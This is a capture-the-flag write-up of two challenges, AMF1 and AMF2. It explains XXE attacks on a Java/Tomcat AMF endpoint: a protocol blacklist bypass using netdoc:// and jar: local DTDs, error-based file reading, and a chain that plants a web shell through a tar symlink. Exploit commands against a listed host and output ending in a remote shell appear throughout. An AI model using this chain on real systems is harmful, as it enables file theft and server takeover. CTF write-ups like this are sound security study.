# AMF1

- in this challenge, it's about XXE with some specific techniques on Java

- the blacklist is: `file|ftp|http|https|data|class|bash|logs|log|conf|etc|session|proc|root|history`

- so you can't make a outbound request to get your remote DTD, this time we need a local DTD to archive XXE. Have a quick look on this awesome blog: https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation/

- with the trick: `jar:/file://[some_zip_file]!/[dtd_inside_the_archive]`, we can make use of local DTD in some jars file of Tomcat
- Reference: https://github.com/GoSecure/dtd-finder/blob/master/list/xxe_payloads_jars.md

- Java has `netdoc://` protocol, which is same as `file://`

- In the context of AMF, it will catch the Exception while handling the xml, and through it as HTTP Response, we can make use of this to archive XXE error-based
    - For ex: 
        - `_://` => no protocol exception

- Final Exploit
    - using `jar://` to load dtd inside some Tomcat jars
    - using `netdoc://` instead of `file://`, `netdoc://` or `file://` can also listing the directory (use to find the flag)
    - amf context exif error message via HTTP Respose + `_://` => error-based XXE

            python amf_xxe.py "http://139.162.40.239:1337/tetctf/messagebroker/amf" foo tetctf_v1


# AMF2

- in the second challenge, we exploit another bug on AMF, trigger `readExternal()` or some public `setters`, this allow us to trigger the `setBackupFile` of `TetCTFUtils`
- `TetCTFUtils.setBackupFile()` execute a `tar` command on arbitrary file on the system, so we need to create and upload a tar symlink file to server with `UploadServlet`
- Another clever way, we can make use of XXE with `jar:http://host/a.zip!/a.txt` with a custom socket server to make the server save the tmp file, and hang the connection to make the tmp file not deleted for a while, then use the xxe bug with `file://` to listing the directory to view the file name of tmp file, and finally, trigger the setter
- The last step: when we have created the symlink to the webroot, we just need to write our shell to the file and it would be written to the webroot as our shell, so you can pass all the filter in the `UploadServlet`

## on your server run: 
    python jar_xxe_server.py

- edit the content of payload `trigger_jar_xxe` in `amf_xxe.py` to point to your socket server

## python tetctf_exp.py 


    [+] trigger_amf_xxe etc_hosts
    etc_hosts output: 
    127.0.0.1	localhost
    ::1	localhost ip6-localhost ip6-loopback
    fe00::0	ip6-localnet
    ff00::0	ip6-mcastprefix
    ff02::1	ip6-allnodes
    ff02::2	ip6-allrouters
    172.17.0.3	02688b965fbd (No such file or directory)...Bwlb.....
    [+] Done
    [+] trigger_amf_xxe trigger_jar_xxe
    [+] trigger_amf_xxe get_tmp_filename
    get_tmp_filename output: 
    jar_cache7343514775749524690.tmp
    safeToDelete.tmp (No such file or directory)...Bwlb.2...
    [+] Done
    [+] tmp filename: jar_cache7343514775749524690.tmp
    [+] generate_amf_setter_payload
    [+] trigger_setter
    AppendToGatewayUrl,;jsessionid=A9A1197B578F257C267FABA24A88FF87	/onStatus 
    C	coderootCausedetailsmessage#Server.ProcessinThe supplied destination id is not registered with any service.
    [+] upload_via_symlink
    { "serviceResponse":"true", "serviceError":null, "serviceName":"File Upload", "opName":"fileUpload" }
    [+] done, enjoy shell
    /peterjson@remote_shell/~.~
    id

    uid=1000(service) gid=1000(service) groups=1000(service)


    None
    /peterjson@remote_shell/~.~
    whoami       

    service



